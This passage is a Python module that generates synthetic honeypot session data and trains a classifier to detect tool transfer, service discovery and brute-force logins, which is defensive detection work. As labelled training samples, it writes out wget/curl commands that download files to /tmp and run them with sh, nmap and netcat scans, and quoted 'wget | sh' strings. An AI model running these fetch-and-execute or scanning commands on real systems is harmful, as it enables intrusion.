"""Deterministic controlled/synthetic PoC for the unified session Model2.

This module deliberately does not access production, MongoDB, PCAP files, or
network services.  It builds complete synthetic episode envelopes from a
pre-registered procedure catalogue, exercises the real 54-feature extractor,
fits one unified multi-label artifact, and opens the final split only after
the model and thresholds have been frozen.

The resulting metrics measure controlled mechanics and separability only.
They are not estimates of real-world accuracy.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import math
import random
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any, Iterable, Mapping, Sequence

from .contract import FEATURE_ORDER, FEATURE_SCHEMA_SHA256, LABEL_ORDER, SCHEMA_ID
from .dataset import DATASET_SCHEMA_VERSION, T1105_NONTRANSFER_HARD_NEGATIVE_TAGS, validate_rows
from .pipeline import extract_features


SEED = 20260926
MODEL_KIND = "STANDARDIZED_OVR_LOGISTIC_REGRESSION"
POC_WARNING = "CONTROLLED_SYNTHETIC_POC_NOT_REAL_WORLD_ACCURACY"


@dataclass(frozen=True)
class Procedure:
    family: str
    split: str
    labels: tuple[bool, bool, bool]
    commands: tuple[str, ...] = ()
    auth_failures: int = 0
    auth_successes: int = 1
    ports: tuple[int, ...] = ()
    response_bytes: int = 0
    tags: tuple[str, ...] = ()


def _procedures() -> tuple[Procedure, ...]:
    """Catalogue is fixed before fitting; family IDs never cross splits."""
    rows: list[Procedure] = []
    variants = {
        "FIT": {
            "get": "wget -O /tmp/update http://198.51.100.10/update",
            "get_exec": "wget -qO /tmp/run http://198.51.100.11/run",
            "get_output": "curl -o /tmp/cache https://198.51.100.12/cache",
            "get_redirect": "curl -L https://198.51.100.13/document",
            "scan": (22, 80, 443, 3306, 6379),
            "discover": "nmap -sT 198.51.100.20",
        },
        "SELECTION": {
            "get": "curl -L -o /tmp/package https://203.0.113.10/package",
            "get_exec": "curl -o /tmp/job http://203.0.113.11/job",
            "get_output": "wget --output-document=/tmp/cache https://203.0.113.12/cache",
            "get_redirect": "curl --location http://203.0.113.13/document",
            "scan": (21, 22, 25, 80, 8080),
            "discover": "nc -z 203.0.113.20 20-90",
        },
        "SEALED_FINAL": {
            "get": "wget -O /tmp/document https://192.0.2.10/document",
            "get_exec": "wget --output-document=/tmp/task https://192.0.2.11/task",
            "get_output": "curl --output=/tmp/cache http://192.0.2.12/cache",
            "get_redirect": "wget --max-redirect=5 http://192.0.2.13/document",
            "scan": (22, 53, 110, 143, 8443),
            "discover": "netcat -z 192.0.2.20 1-100",
        },
    }
    for split, value in variants.items():
        prefix = split.lower().replace("_", "-")
        get = value["get"]
        get_exec = value["get_exec"]
        get_output = value["get_output"]
        get_redirect = value["get_redirect"]
        scan = value["scan"]
        discover = value["discover"]
        transfer_tags = ("session_bound_transfer_activity", "valid_transfer_attempt")
        no_transfer_tag = ("no_session_bound_transfer",)
        rows.extend(
            [
                Procedure(f"{prefix}-none", split, (False, False, False), ("id", "uname -a"), ports=(22,), tags=no_transfer_tag),
                Procedure(f"{prefix}-transfer-basic", split, (True, False, False), (get,), ports=(80,), response_bytes=106496, tags=transfer_tags + ("transfer_basic",)),
                # Same observable command/flow and nuisance stream as transfer-basic.
                # Benign content does not change the T1105 behavior label.
                Procedure(f"{prefix}-benign-content-transfer", split, (True, False, False), (get,), ports=(80,), response_bytes=106496, tags=transfer_tags + ("benign_content_transfer_positive",)),
                Procedure(f"{prefix}-transfer-output-file", split, (True, False, False), (get_output,), ports=(443,), response_bytes=73728, tags=transfer_tags + ("transfer_output_file",)),
                Procedure(f"{prefix}-transfer-redirect", split, (True, False, False), (get_redirect,), ports=(80,), response_bytes=65536, tags=transfer_tags + ("transfer_redirect",)),
                Procedure(f"{prefix}-transfer-execute", split, (True, False, False), (get_exec, "sh /tmp/task"), ports=(443,), response_bytes=106496, tags=transfer_tags + ("transfer_then_execute",)),
                Procedure(f"{prefix}-transfer-chmod", split, (True, False, False), (get, "chmod +x /tmp/task"), ports=(80,), response_bytes=81920, tags=transfer_tags + ("transfer_chmod",)),
                Procedure(f"{prefix}-transfer-extract", split, (True, False, False), (get, "tar -xf /tmp/task"), ports=(80,), response_bytes=90112, tags=transfer_tags + ("transfer_extract",)),
                Procedure(f"{prefix}-transfer-cleanup", split, (True, False, False), (get, "rm /tmp/task"), ports=(80,), response_bytes=86016, tags=transfer_tags + ("transfer_cleanup",)),
                Procedure(f"{prefix}-transfer-attempt-no-session-flow", split, (False, False, False), (get,), ports=(), tags=no_transfer_tag + ("transfer_attempt_no_session_flow",)),
                Procedure(f"{prefix}-discovery", split, (False, True, False), (discover,), ports=scan, tags=no_transfer_tag + ("discovery_only",)),
                Procedure(f"{prefix}-bruteforce", split, (False, False, True), (), auth_failures=7, auth_successes=0, ports=(22,), tags=no_transfer_tag),
                Procedure(f"{prefix}-transfer-discovery", split, (True, True, False), (discover, get), ports=scan + (80,), response_bytes=106496, tags=transfer_tags + ("mixed_ttp",)),
                Procedure(f"{prefix}-transfer-auth", split, (True, False, True), (get,), auth_failures=6, auth_successes=1, ports=(22, 443), response_bytes=106496, tags=transfer_tags + ("mixed_ttp",)),
                Procedure(f"{prefix}-discovery-auth", split, (False, True, True), (discover,), auth_failures=6, auth_successes=0, ports=scan, tags=no_transfer_tag + ("mixed_ttp",)),
                Procedure(f"{prefix}-all", split, (True, True, True), (discover, get_exec, "sh /tmp/task"), auth_failures=6, auth_successes=1, ports=scan + (443,), response_bytes=106496, tags=transfer_tags + ("mixed_ttp", "transfer_then_execute")),
                Procedure(f"{prefix}-embedded-text", split, (False, False, False), ("echo 'wget http://example.invalid/a | sh'",), ports=(), tags=no_transfer_tag + ("embedded_transfer_text",)),
                Procedure(f"{prefix}-quoted-pipe-text", split, (False, False, False), ("printf 'curl https://example.invalid/a | sh'",), ports=(), tags=no_transfer_tag + ("quoted_transfer_text",)),
                Procedure(f"{prefix}-wget-help", split, (False, False, False), ("wget --help",), ports=(), tags=no_transfer_tag + ("wget_help",)),
                Procedure(f"{prefix}-curl-version", split, (False, False, False), ("curl --version",), ports=(), tags=no_transfer_tag + ("curl_version",)),
                Procedure(f"{prefix}-malformed-transfer", split, (False, False, False), ("wget --output-document=/tmp/file", "curl -o /tmp/cache"), ports=(), tags=no_transfer_tag + ("malformed_transfer",)),
                Procedure(f"{prefix}-url-without-tool", split, (False, False, False), ("echo https://example.invalid/document",), ports=(), tags=no_transfer_tag + ("url_without_transfer_tool",)),
                Procedure(f"{prefix}-local-file-operation", split, (False, False, False), ("cat /tmp/document", "ls -l /tmp"), ports=(), tags=no_transfer_tag + ("local_file_operation",)),
                Procedure(f"{prefix}-execute-existing-local-file", split, (False, False, False), ("sh /usr/bin/true",), ports=(), tags=no_transfer_tag + ("execute_existing_local_file",)),
                Procedure(f"{prefix}-ordinary-auth-only", split, (False, False, False), (), auth_failures=0, auth_successes=1, ports=(22,), tags=no_transfer_tag + ("ordinary_auth_only",)),
                Procedure(f"{prefix}-successful-login-transfer", split, (True, False, False), (get, "id", "uname -a"), auth_failures=0, auth_successes=1, ports=(22, 80), response_bytes=106496, tags=transfer_tags + ("single_success_t1110_hard_negative",)),
                Procedure(f"{prefix}-successful-login-discovery", split, (False, True, False), ("id", discover), auth_failures=0, auth_successes=1, ports=(22,) + scan, tags=no_transfer_tag + ("single_success_t1110_hard_negative",)),
                Procedure(f"{prefix}-successful-login-command-mix", split, (False, False, False), ("id", "uname -a", "pwd", "ls -la", "cat /etc/os-release"), auth_failures=0, auth_successes=1, ports=(22,), tags=no_transfer_tag + ("single_success_t1110_hard_negative",)),
                Procedure(f"{prefix}-single-service", split, (False, False, False), ("ss -tn",), ports=(443,), tags=no_transfer_tag + ("single_service_access",)),
                Procedure(f"{prefix}-benign-auth-retry", split, (False, False, False), (), auth_failures=1, auth_successes=1, ports=(22,), tags=no_transfer_tag + ("benign_auth_retry",)),
            ]
        )
    return tuple(rows)


def _digest(value: Any) -> str:
    payload = json.dumps(value, sort_keys=True, separators=(",", ":"), ensure_ascii=False, default=str)
    return hashlib.sha256(payload.encode()).hexdigest()


def _event(identity: Mapping[str, str], seq: int, when: datetime, eventid: str, **fields: Any) -> dict[str, Any]:
    return {
        "source_event_key": f"evt-{identity['episode_id']}-{seq}",
        "source_sequence": seq,
        "session_id": identity["source_session_id"],
        "eventid": eventid,
        "timestamp": when.isoformat().replace("+00:00", "Z"),
        **fields,
    }


def _episode(procedure: Procedure, repetition: int) -> tuple[dict[str, Any], dict[str, str]]:
    token = f"{procedure.family}-r{repetition}"
    identity = {
        "source_session_id": f"synthetic-session-{token}",
        "run_id": f"synthetic-run-{token}",
        "measurement_id": f"synthetic-measurement-{token}",
        "episode_id": f"synthetic-episode-{token}",
    }
    # The benign-content retrieval is deliberately nuisance-matched to the
    # basic transfer case. Using a family-specific random stream would create
    # a synthetic timing/byte shortcut and produce misleadingly optimistic
    # results. Both have the same T1105 label under this honeypot threat model.
    nuisance_family = procedure.family.replace("benign-content-transfer", "transfer-basic")
    rng = random.Random(f"{SEED}:{nuisance_family}-r{repetition}")
    start = datetime(2026, 9, 26, tzinfo=timezone.utc) + timedelta(minutes=repetition)
    events: list[dict[str, Any]] = []
    seq = 1
    cursor = start
    events.append(_event(identity, seq, cursor, "cowrie.session.connect"))
    seq += 1
    for index in range(procedure.auth_failures):
        cursor += timedelta(seconds=0.5 + rng.random() * 1.5)
        events.append(_event(identity, seq, cursor, "cowrie.login.failed", username=f"candidate-{index % 4}"))
        seq += 1
    for _ in range(procedure.auth_successes):
        cursor += timedelta(seconds=0.5 + rng.random())
        events.append(_event(identity, seq, cursor, "cowrie.login.success", username="accepted-user"))
        seq += 1
    for command in procedure.commands:
        cursor += timedelta(seconds=1.0 + rng.random() * 2.0)
        events.append(_event(identity, seq, cursor, "cowrie.command.input", input=command))
        seq += 1
    cursor += timedelta(seconds=2.0 + rng.random() * 3.0)
    events.append(_event(identity, seq, cursor, "cowrie.session.closed"))

    flows: list[dict[str, Any]] = []
    for index, port in enumerate(procedure.ports):
        established = not (procedure.labels[1] and index % 3 == 2)
        flows.append(
            {
                "uid": f"C{_digest([token, index])[:12]}",
                "flow_binding": "PASS",
                "episode_binding": identity,
                "tuple": {
                    "orig_h": "192.0.2.100",
                    "orig_p": str(40000 + index),
                    "resp_h": "198.51.100.200",
                    "resp_p": str(port),
                    "proto": "tcp",
                },
                "duration": round(0.1 + rng.random() * 2.0, 6),
                "orig_bytes": float(64 + rng.randrange(0, 64)),
                "resp_bytes": float(procedure.response_bytes if index == len(procedure.ports) - 1 and procedure.response_bytes else rng.randrange(0, 512)),
                "orig_pkts": float(2 + rng.randrange(0, 4)),
                "resp_pkts": float(2 + rng.randrange(0, 5)),
                "ts_utc": (start + timedelta(seconds=0.2 + index * 0.25)).isoformat().replace("+00:00", "Z"),
                "conn_state": "SF" if established else "S0",
            }
        )
    cowrie_sha = _digest(events)
    pcap_sha = _digest([identity, "synthetic-pcap", flows])
    conn_sha = _digest([identity, "synthetic-conn", flows])
    envelope = {
        "cowrie": {
            "identity": identity,
            "complete": True,
            "auth_telemetry_complete": True,
            "event_log_sha256": cowrie_sha,
            "events": events,
        },
        "network": {
            "identity": identity,
            "complete": True,
            "pcap": {"finalized": True, "drop_count": 0, "sha256": pcap_sha},
            "zeek": {
                "status": "COMPLETE",
                "pcap_sha256": pcap_sha,
                "conn_log_sha256": conn_sha,
                "identity": identity,
            },
            "flows": flows,
        },
    }
    return envelope, identity


def _extractor_hash() -> str:
    here = Path(__file__).resolve().parent
    return hashlib.sha256((here / "pipeline.py").read_bytes()).hexdigest()


def build_corpus(repetitions: int = 4) -> tuple[list[dict[str, Any]], dict[str, Any]]:
    procedures = _procedures()
    split_definition = [
        {"family": p.family, "split": p.split, "labels": p.labels, "tags": p.tags}
        for p in procedures
    ]
    split_hash = _digest(split_definition)
    extractor_hash = _extractor_hash()
    rows: list[dict[str, Any]] = []
    for procedure in procedures:
        for repetition in range(1, repetitions + 1):
            envelope, identity = _episode(procedure, repetition)
            result = extract_features(envelope, expected_identity=identity)
            sample_id = f"{procedure.family}-r{repetition}"
            labels = {label: procedure.labels[index] for index, label in enumerate(LABEL_ORDER)}
            row = {
                "sample_id": sample_id,
                "procedure_family_id": procedure.family,
                "duplicate_group_id": procedure.family,
                "variant_id": f"{procedure.family}-controlled-v1",
                "repetition_id": f"rep-{repetition}",
                "split": procedure.split,
                "dataset_schema_version": DATASET_SCHEMA_VERSION,
                "feature_schema_id": SCHEMA_ID,
                "feature_schema_sha256": FEATURE_SCHEMA_SHA256,
                "extractor_code_sha256": extractor_hash,
                "split_manifest_sha256": split_hash,
                "source_binding": {
                    **identity,
                    "cowrie_event_log_sha256": result["provenance"]["cowrie_event_log_sha256"],
                    "pcap_sha256": result["provenance"]["pcap_sha256"],
                    "zeek_conn_log_sha256": result["provenance"]["zeek_conn_log_sha256"],
                },
                "source_evidence_sha256": _digest([identity, result["provenance"]]),
                "availability_states": {"cowrie": "COMPLETE", "auth": "COMPLETE", "pcap": "COMPLETE", "zeek_conn": "COMPLETE"},
                "feature_vector": result["feature_vector"],
                "labels": labels,
                "label_provenance": {
                    "human_adjudication": False,
                    "reviewer_blind_to_model_outputs": None,
                    "labels_defined_before_fit": True,
                    "model_outputs_used": False,
                    "source_kind": "preregistered_control_semantics",
                    "evidence_reference": f"procedure-catalogue:{procedure.family}",
                    "adjudication_protocol_sha256": _digest("controlled-procedure-label-protocol-v1"),
                },
                "control_tags": list(procedure.tags),
            }
            rows.append(row)
    fit_selection = [row for row in rows if row["split"] != "SEALED_FINAL"]
    validation = validate_rows(fit_selection)
    manifest = {
        "warning": POC_WARNING,
        "dataset_type": "CONTROLLED_SYNTHETIC_POC",
        "state": "GENERATED_SYNTHETIC_ONLY_NOT_REAL_SESSION_DATA",
        "seed": SEED,
        "repetitions_per_family": repetitions,
        "feature_schema_id": SCHEMA_ID,
        "feature_schema_sha256": FEATURE_SCHEMA_SHA256,
        "split_manifest_sha256": split_hash,
        "rows_total": len(rows),
        "families_total": len(procedures),
        "split_rows": {split: sum(row["split"] == split for row in rows) for split in ("FIT", "SELECTION", "SEALED_FINAL")},
        "split_families": {split: sum(p.split == split for p in procedures) for split in ("FIT", "SELECTION", "SEALED_FINAL")},
        "fit_selection_validation": validation,
        "labels_are_procedure_defined_not_model_generated": True,
        "human_adjudication_performed": False,
        "final_partition_labels_in_same_synthetic_file": True,
        "external_final_label_escrow": False,
        "t1105_semantics": "SESSION_BOUND_TRANSFER_ACTIVITY",
        "benign_content_transfer_label": "T1105_POSITIVE",
        "http_log_used": False,
    }
    return rows, manifest


def _sigmoid(value: float) -> float:
    if value >= 0:
        z = math.exp(-value)
        return 1.0 / (1.0 + z)
    z = math.exp(value)
    return z / (1.0 + z)


def _standardizer(rows: Sequence[Mapping[str, Any]]) -> tuple[list[float], list[float]]:
    matrix = [[float(row["feature_vector"][name]) for name in FEATURE_ORDER] for row in rows]
    means = [sum(values) / len(values) for values in zip(*matrix)]
    scales = []
    for index, values in enumerate(zip(*matrix)):
        variance = sum((value - means[index]) ** 2 for value in values) / len(matrix)
        scales.append(math.sqrt(variance) if variance > 1e-12 else 1.0)
    return means, scales


def _x(row: Mapping[str, Any], means: Sequence[float], scales: Sequence[float], indices: Sequence[int]) -> list[float]:
    return [(float(row["feature_vector"][FEATURE_ORDER[index]]) - means[index]) / scales[index] for index in indices]


def _fit_binary(
    rows: Sequence[Mapping[str, Any]], label: str, means: Sequence[float], scales: Sequence[float], indices: Sequence[int]
) -> dict[str, Any]:
    matrix = [_x(row, means, scales, indices) for row in rows]
    targets = [1.0 if row["labels"][label] else 0.0 for row in rows]
    positives = sum(targets)
    negatives = len(targets) - positives
    positive_weight = len(targets) / (2.0 * positives) if positives else 1.0
    negative_weight = len(targets) / (2.0 * negatives) if negatives else 1.0
    weights = [0.0] * len(indices)
    bias = 0.0
    learning_rate = 0.08
    regularization = 0.002
    epochs = 1800
    for epoch in range(epochs):
        grad = [0.0] * len(weights)
        grad_bias = 0.0
        for vector, target in zip(matrix, targets):
            probability = _sigmoid(bias + sum(w * v for w, v in zip(weights, vector)))
            sample_weight = positive_weight if target else negative_weight
            error = (probability - target) * sample_weight
            grad_bias += error
            for index, value in enumerate(vector):
                grad[index] += error * value
        count = float(len(rows))
        rate = learning_rate / math.sqrt(1.0 + epoch / 300.0)
        bias -= rate * grad_bias / count
        for index in range(len(weights)):
            weights[index] -= rate * (grad[index] / count + regularization * weights[index])
    return {"weights": weights, "bias": bias, "threshold": 0.5}


def _probability(model: Mapping[str, Any], row: Mapping[str, Any], means: Sequence[float], scales: Sequence[float], indices: Sequence[int]) -> float:
    vector = _x(row, means, scales, indices)
    return _sigmoid(float(model["bias"]) + sum(float(w) * v for w, v in zip(model["weights"], vector)))


def _confusion(rows: Sequence[Mapping[str, Any]], label: str, probabilities: Sequence[float], threshold: float) -> dict[str, Any]:
    tp = fp = tn = fn = 0
    for row, probability in zip(rows, probabilities):
        actual = bool(row["labels"][label])
        predicted = probability >= threshold
        if actual and predicted:
            tp += 1
        elif not actual and predicted:
            fp += 1
        elif not actual and not predicted:
            tn += 1
        else:
            fn += 1
    def ratio(a: float, b: float) -> float | None:
        return a / b if b else None
    precision = ratio(tp, tp + fp)
    recall = ratio(tp, tp + fn)
    specificity = ratio(tn, tn + fp)
    f1 = 2 * precision * recall / (precision + recall) if precision is not None and recall is not None and precision + recall else 0.0
    balanced = (recall + specificity) / 2.0 if recall is not None and specificity is not None else None
    return {
        "support": len(rows), "positive_support": tp + fn, "negative_support": tn + fp,
        "tp": tp, "fp": fp, "tn": tn, "fn": fn,
        "precision": precision, "recall": recall, "f1": f1,
        "specificity": specificity,
        "false_positive_rate": ratio(fp, fp + tn),
        "false_negative_rate": ratio(fn, fn + tp),
        "balanced_accuracy": balanced,
    }


def _choose_threshold(rows: Sequence[Mapping[str, Any]], label: str, probabilities: Sequence[float]) -> tuple[float, dict[str, Any]]:
    candidates = [value / 100 for value in range(10, 91, 5)]
    scored = [(threshold, _confusion(rows, label, probabilities, threshold)) for threshold in candidates]
    return max(scored, key=lambda item: (item[1]["f1"], item[1]["balanced_accuracy"] or 0.0, -abs(item[0] - 0.5)))


def _collision_audit(rows: Sequence[Mapping[str, Any]]) -> dict[str, Any]:
    groups: dict[str, list[Mapping[str, Any]]] = {}
    for row in rows:
        digest = _digest(row["feature_vector"])
        groups.setdefault(digest, []).append(row)
    conflicts = []
    for digest, members in groups.items():
        label_sets = {tuple(bool(member["labels"][label]) for label in LABEL_ORDER) for member in members}
        if len(label_sets) > 1:
            conflicts.append({
                "feature_vector_sha256": digest,
                "rows": len(members),
                "families": sorted({str(member["procedure_family_id"]) for member in members}),
                "label_vectors": [list(value) for value in sorted(label_sets)],
            })
    return {"unique_vectors": len(groups), "conflicting_vector_groups": len(conflicts), "conflicts": conflicts}


def _feature_indices(feature_mode: str) -> list[int]:
    if feature_mode == "full":
        return list(range(len(FEATURE_ORDER)))
    if feature_mode == "command_presence":
        # Counts/presence only: no sequence ordering, timing, auth, or network
        # volume. This is an explicit ablation, not Model1's command ranking.
        names = {
            "command_event_count", "unique_command_family_count",
            "unknown_command_family_count", "transfer_tool_command_count",
        }
        return [index for index, name in enumerate(FEATURE_ORDER) if name in names]
    if feature_mode == "without_sequence":
        return [index for index, name in enumerate(FEATURE_ORDER) if not 11 <= index < 20]
    raise ValueError("unknown_feature_mode")


def fit_candidate(rows: Sequence[Mapping[str, Any]], feature_mode: str = "full") -> tuple[dict[str, Any], dict[str, Any]]:
    """Fit and freeze preprocessing, weights, and thresholds without reading final labels."""
    fit = [row for row in rows if row["split"] == "FIT"]
    selection = [row for row in rows if row["split"] == "SELECTION"]
    if not fit or not selection:
        raise ValueError("fit_and_selection_rows_required")
    split_hashes = {str(row["split_manifest_sha256"]) for row in rows}
    if len(split_hashes) != 1:
        raise ValueError("split_manifest_identity_mismatch")
    indices = _feature_indices(feature_mode)
    means, scales = _standardizer(fit)
    heads: dict[str, Any] = {}
    selection_metrics: dict[str, Any] = {}
    for label in LABEL_ORDER:
        head = _fit_binary(fit, label, means, scales, indices)
        selection_probabilities = [_probability(head, row, means, scales, indices) for row in selection]
        threshold, metrics = _choose_threshold(selection, label, selection_probabilities)
        head["threshold"] = threshold
        heads[label] = head
        selection_metrics[label] = metrics
    artifact = {
        "warning": POC_WARNING,
        "model_kind": MODEL_KIND,
        "architecture": "UNIFIED_ARTIFACT_WITH_THREE_OVR_HEADS",
        "feature_mode": feature_mode,
        "feature_schema_id": SCHEMA_ID,
        "feature_schema_sha256": FEATURE_SCHEMA_SHA256,
        "feature_order": list(FEATURE_ORDER),
        "label_semantics": {
            "T1105": "SESSION_BOUND_TRANSFER_ACTIVITY",
            "T1046": "CONTROLLED_SESSION_SERVICE_DISCOVERY_BEHAVIOR",
            "T1110": "CONTROLLED_SESSION_REPEATED_AUTH_GUESSING_BEHAVIOR",
            "not_inferred": ["transfer_completion", "artifact_maliciousness", "attacker_intent", "trusted_finding"],
        },
        "selected_feature_indices": indices,
        "selected_feature_names": [FEATURE_ORDER[index] for index in indices],
        "standardizer": {"means": means, "scales": scales},
        "heads": heads,
        "seed": SEED,
        "fit_rows": len(fit),
        "selection_rows": len(selection),
        "training_data_sha256": _rowset_digest(fit),
        "selection_data_sha256": _rowset_digest(selection),
        "split_manifest_sha256": next(iter(split_hashes)),
        "training_protocol": {
            "weights_fit_split": "FIT",
            "standardizer_fit_split": "FIT",
            "threshold_selection_split": "SELECTION",
            "labels_source": "PREREGISTERED_CONTROL_SEMANTICS_NOT_MODEL_OUTPUTS",
            "score_semantics": "SIGMOID_DECISION_SCORE_NOT_CALIBRATED_PROBABILITY",
        },
        "production_use": False,
    }
    artifact["artifact_sha256"] = _digest(artifact)
    evaluation = {
        "warning": POC_WARNING,
        "feature_mode": feature_mode,
        "fit_rows": len(fit),
        "selection_rows": len(selection),
        "selection_metrics": selection_metrics,
        "thresholds_frozen": {label: heads[label]["threshold"] for label in LABEL_ORDER},
        "artifact_canonical_model_identity_sha256": artifact["artifact_sha256"],
    }
    return artifact, evaluation


T1105_SLICE_TAGS = {
    "basic_transfer": {"transfer_basic"},
    "benign_content_transfer": {"benign_content_transfer_positive"},
    "transfer_then_execute": {"transfer_then_execute"},
    "mixed_ttp": {"mixed_ttp"},
    "malformed_help_text_negatives": {
        "malformed_transfer", "wget_help", "curl_version",
        "embedded_transfer_text", "quoted_transfer_text",
    },
    "url_without_tool": {"url_without_transfer_tool"},
    "local_file_operation": {"local_file_operation"},
    "no_transfer_session": {"no_session_bound_transfer"},
}


def _evaluate_frozen_candidates(
    rows: Sequence[Mapping[str, Any]],
    candidates: Mapping[str, tuple[Mapping[str, Any], Mapping[str, Any]]],
) -> dict[str, dict[str, Any]]:
    """Score all already-hashed modes in one final-set evaluation pass."""
    final = [row for row in rows if row["split"] == "SEALED_FINAL"]
    if not final or any(not artifact.get("artifact_sha256") for artifact, _ in candidates.values()):
        raise ValueError("frozen_candidates_and_final_rows_required")
    results: dict[str, dict[str, Any]] = {}
    for mode, (artifact, fit_report) in candidates.items():
        indices = artifact["selected_feature_indices"]
        means = artifact["standardizer"]["means"]
        scales = artifact["standardizer"]["scales"]
        heads = artifact["heads"]
        final_metrics: dict[str, Any] = {}
        probabilities_by_label: dict[str, list[float]] = {}
        for label in LABEL_ORDER:
            probabilities = [
                _probability(heads[label], row, means, scales, indices)
                for row in final
            ]
            probabilities_by_label[label] = probabilities
            final_metrics[label] = _confusion(
                final, label, probabilities, float(heads[label]["threshold"])
            )
        t1105_slices: dict[str, Any] = {}
        for slice_name, tags in T1105_SLICE_TAGS.items():
            slice_rows = [row for row in final if tags.intersection(row["control_tags"])]
            slice_probabilities = [
                _probability(heads["T1105"], row, means, scales, indices)
                for row in slice_rows
            ]
            t1105_slices[slice_name] = _confusion(
                slice_rows, "T1105", slice_probabilities, float(heads["T1105"]["threshold"])
            )
        results[mode] = {
            **dict(fit_report),
            "scored_sealed_final_rows": len(final),
            "final_metrics": final_metrics,
            "t1105_slices": t1105_slices,
            "score_semantics": "SIGMOID_DECISION_SCORE_NOT_CALIBRATED_PROBABILITY",
        }
    return results


def train_and_evaluate(rows: Sequence[Mapping[str, Any]], feature_mode: str = "full") -> tuple[dict[str, Any], dict[str, Any]]:
    """Single-mode convenience wrapper used by tests; freezes before final scoring."""
    artifact, fit_report = fit_candidate(rows, feature_mode)
    evaluation = _evaluate_frozen_candidates(rows, {feature_mode: (artifact, fit_report)})[feature_mode]
    return artifact, evaluation


def _matched_benign_content_audit(rows: Sequence[Mapping[str, Any]]) -> dict[str, Any]:
    by_split_rep: dict[tuple[str, str], dict[str, Mapping[str, Any]]] = {}
    for row in rows:
        tags = set(row["control_tags"])
        key = (str(row["split"]), str(row["repetition_id"]))
        if "transfer_basic" in tags:
            by_split_rep.setdefault(key, {})["basic"] = row
        if "benign_content_transfer_positive" in tags:
            by_split_rep.setdefault(key, {})["benign"] = row
    matched = 0
    equal_features = 0
    equal_labels = 0
    for pair in by_split_rep.values():
        if set(pair) != {"basic", "benign"}:
            continue
        matched += 1
        equal_features += pair["basic"]["feature_vector"] == pair["benign"]["feature_vector"]
        equal_labels += pair["basic"]["labels"] == pair["benign"]["labels"]
    return {
        "matched_pairs": matched,
        "identical_feature_pairs": equal_features,
        "identical_label_pairs": equal_labels,
        "pass": matched > 0 and matched == equal_features == equal_labels,
        "labels_are_t1105_positive_for_both": True,
    }


def _rowset_digest(rows: Sequence[Mapping[str, Any]]) -> str:
    selected = sorted(rows, key=lambda row: str(row["sample_id"]))
    return _digest(selected)


def _label_support(rows: Sequence[Mapping[str, Any]]) -> dict[str, dict[str, int]]:
    return {
        label: {
            "positive": sum(bool(row["labels"][label]) for row in rows),
            "negative": sum(not bool(row["labels"][label]) for row in rows),
        }
        for label in LABEL_ORDER
    }


def _write_json(path: Path, value: Any) -> str:
    serialized = json.dumps(value, indent=2, ensure_ascii=False) + "\n"
    path.write_text(serialized, encoding="utf-8")
    return hashlib.sha256(serialized.encode("utf-8")).hexdigest()


def _update_package_manifests(
    package_root: Path,
    *,
    rows: Sequence[Mapping[str, Any]],
    dataset_manifest: Mapping[str, Any],
    artifact: Mapping[str, Any],
    hashes: Mapping[str, str],
    collision_audit: Mapping[str, Any],
    matched_audit: Mapping[str, Any],
    hard_negative_false_positives: int,
) -> None:
    candidate_path = package_root / "CANDIDATE_MANIFEST.v1.json"
    dataset_path = package_root / "DATASET_MANIFEST.v1.json"
    candidate = json.loads(candidate_path.read_text(encoding="utf-8"))
    dataset = json.loads(dataset_path.read_text(encoding="utf-8"))
    splits = ("FIT", "SELECTION", "SEALED_FINAL")
    candidate.update({
        "candidate_id": "MODEL2_UNIFIED_54F_CONTROLLED_SYNTHETIC_POC_20260926_V2_T1105_SEMANTICS",
        "candidate_selection": "thresholds selected on SELECTION; synthetic evaluation partition scored after freeze (labels remain in corpus file)",
        "canonical_model_identity_sha256": artifact["artifact_sha256"],
        "serialized_artifact_sha256": hashes["serialized_artifact_sha256"],
        "serialized_dataset_sha256": hashes["serialized_dataset_sha256"],
        "dataset_content_sha256": hashes["full_dataset_content_sha256"],
        "fit_selection_content_sha256": hashes["fit_selection_content_sha256"],
        "split_manifest_sha256": dataset_manifest["split_manifest_sha256"],
        "training_rows": sum(row["split"] == "FIT" for row in rows),
        "selection_rows": sum(row["split"] == "SELECTION" for row in rows),
        "sealed_final_rows": sum(row["split"] == "SEALED_FINAL" for row in rows),
        "procedure_families": len({row["procedure_family_id"] for row in rows}),
        "dataset_type": "CONTROLLED_SYNTHETIC_POC",
        "label_source": "PREREGISTERED_CONTROL_SEMANTICS_NOT_MODEL_OUTPUTS",
        "human_adjudication_performed": False,
        "labels_defined_before_fit": True,
        "real_world_accuracy_estimated": False,
        "score_semantics": "SIGMOID_DECISION_SCORE_NOT_CALIBRATED_PROBABILITY",
        "t1105_controlled_gate": (
            "ALLOW_CONTROLLED_RESEARCH_ONLY"
            if collision_audit.get("conflicting_vector_groups") == 0
            and matched_audit.get("pass")
            and hard_negative_false_positives == 0
            else "BLOCK"
        ),
        "production_t1105_gate": "BLOCK",
        "t1105_ensemble_gate": "BLOCK",
        "conflicting_feature_label_collisions": collision_audit.get("conflicting_vector_groups"),
        "matched_benign_content_transfer_pairs": matched_audit.get("matched_pairs"),
        "matched_benign_content_transfer_pass": matched_audit.get("pass"),
        "t1105_nontransfer_hard_negative_false_positives": hard_negative_false_positives,
        "authority": "RESEARCH_ONLY_NON_AUTHORITATIVE",
        "production_ready": False,
    })
    split_details = {
        split: {
            "rows": sum(row["split"] == split for row in rows),
            "procedure_families": len({row["procedure_family_id"] for row in rows if row["split"] == split}),
            "labels_present_in_synthetic_corpus": True,
            "scored_after_candidate_freeze": split == "SEALED_FINAL",
        }
        for split in splits
    }
    dataset.update({
        "dataset_type": "CONTROLLED_SYNTHETIC_POC",
        "state": "GENERATED_SYNTHETIC_ONLY_NOT_REAL_SESSION_DATA",
        "rows_total": len(rows),
        "procedure_families_total": len({row["procedure_family_id"] for row in rows}),
        "splits": split_details,
        "label_support": {
            label: {
                **support,
                "nontransfer_hard_negative_rows": sum(
                    row["split"] != "SEALED_FINAL"
                    and not bool(row["labels"][label])
                    and bool(set(row["control_tags"]).intersection(T1105_NONTRANSFER_HARD_NEGATIVE_TAGS))
                    for row in rows
                ) if label == "T1105" else None,
                "benign_content_transfer_positive_rows": sum(
                    row["split"] != "SEALED_FINAL"
                    and "benign_content_transfer_positive" in row["control_tags"]
                    and bool(row["labels"][label])
                    for row in rows
                ) if label == "T1105" else None,
            }
            for label, support in _label_support(rows).items()
        },
        "label_provenance": "Scenario-defined before fitting; no human adjudication; model outputs not used as labels.",
        "final_partition_labels_in_same_synthetic_file": True,
        "external_final_label_escrow": False,
